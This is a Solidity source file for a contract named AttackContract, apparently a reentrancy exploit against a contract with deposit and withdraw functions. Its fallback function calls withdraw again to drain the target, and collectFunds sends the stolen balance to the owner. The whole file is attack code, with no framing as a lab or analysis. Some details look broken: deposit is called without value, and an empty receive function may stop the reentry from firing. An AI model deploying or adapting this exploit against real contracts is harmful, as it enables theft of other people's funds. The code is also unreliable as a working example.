// SPDX-License-Identifier: MIT

pragma solidity ^0.8;

interface IVulnerableContract {
    function deposit() external payable;
    function withdraw() external payable;
}

contract AttackContract {

    IVulnerableContract public vulnerableContract;
    address owner;

    constructor (address _vulnerableAddress) payable {
        vulnerableContract = IVulnerableContract(_vulnerableAddress);
        owner = msg.sender;
    }

    fallback() external payable {
        vulnerableContract.withdraw();
    }

    function attack() public {
        if (msg.sender != owner) {
            revert("Not owner!");
        }
        vulnerableContract.deposit();
        vulnerableContract.withdraw();
    }

    function collectFunds() external {
        if (msg.sender != owner) {
            revert("Not owner!");
        }
        (bool sent, ) = owner.call{value: address(this).balance}("");
        if (!sent) {
            revert("Transaction Failed!");
        }
    }

    receive() external payable {}
}